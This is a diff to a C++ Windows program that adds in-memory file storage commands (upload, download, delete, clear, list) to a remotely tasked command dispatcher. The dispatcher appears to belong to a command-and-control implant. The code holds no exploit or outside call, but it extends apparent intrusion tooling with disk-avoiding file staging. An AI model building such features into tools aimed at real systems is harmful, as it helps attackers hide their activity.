@@ -25,10 +25,10 @@ errors without relying on addtl branch logic. I try to use windows error  macro 
 #include "../data/msgpack/msgpack.h"
 #include "settings.h"
 #include "../data/structs.h"
+#include "../systems/memstore.h"
 
 #include <windows.h>
 #include <string>
-#include <iostream>
 //move to own file?
 std::string GetErrorMessage(DWORD dwErrorCode) {
     if (dwErrorCode == ERROR_SUCCESS) {
@@ -272,6 +272,101 @@ nlohmann::json command_tree(nlohmann::json task_data) {
 
         return result;
     }
+    else if (task_name == "memstore upload") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_contents") || !args["file_contents"].is_binary()) {
+            add_text_result(result, "error", "Task failed: 'file_contents' is missing or not binary.");
+            return result;
+        }
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_name' is missing or not a string.");
+            return result;
+        }
+
+        std::string file_name = task_data["task"]["args"]["file_name"];
+
+        //get element
+        auto& json_element = task_data["task"]["args"]["file_contents"];
+        //turn into bytes, tldr, need to call get_binary from nholmann json to get proper bin data
+        std::vector<uint8_t> file_bytes;
+        file_bytes = json_element.get_binary();
+
+        int windows_error_code = MemStore::instance().store(file_name, file_bytes);
+
+        //store does not have a return type/good way to check success yet, for now, assuming it was successful
+        //could do a "num of items before, then add, and if items = items +1"
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        return result;
+
+
+    }
+    else if (task_name == "memstore download") {
+        nlohmann::json result;
+
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
+            return result;
+        }
+
+        std::string memstore_file_to_download = task_data["task"]["args"]["file_name"];
+
+        std::vector<uint8_t> memstore_file_bytes = MemStore::instance().get(memstore_file_to_download);
+
+        add_bytes_result(result, "file_contents", memstore_file_bytes);
+        return result;
+    }
+    else if (task_name == "memstore delete") {
+        nlohmann::json result;
+
+        //check for correct values
+        auto& args = task_data["task"]["args"];
+        if (!args.contains("file_name") || !args["file_name"].is_string()) {
+            add_text_result(result, "error", "Task failed: 'file_name' is missing or not string.");
+            return result;
+        }
+
+        std::string memstore_file_to_remove = task_data["task"]["args"]["file_name"];
+
+        int windows_error_code = MemStore::instance().remove(memstore_file_to_remove);
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        return result;
+
+
+    }
+    else if (task_name == "memstore clear") {
+        nlohmann::json result;
+
+        //currently always returns success
+        int windows_error_code = MemStore::instance().clear();
+
+        add_text_result(result, "message", GetErrorMessage(windows_error_code));
+        add_int_result(result, "windows_error_code", windows_error_code);
+        return result;
+
+    }
+    else if (task_name == "memstore list") {
+        nlohmann::json result;
+
+        std::vector<std::string> file_names = MemStore::instance().get_file_names();
+
+        std::string output;
+        for (std::string file_name: file_names) {
+            output += file_name;
+            output += "\n";
+        }
+
+        //std::cout << output << std::endl;
+
+        add_text_result(result, "data", output);
+
+        return result;
+    }
+
     else if (task_name == "exit") {
         //no return, just kill it
         exit(0);
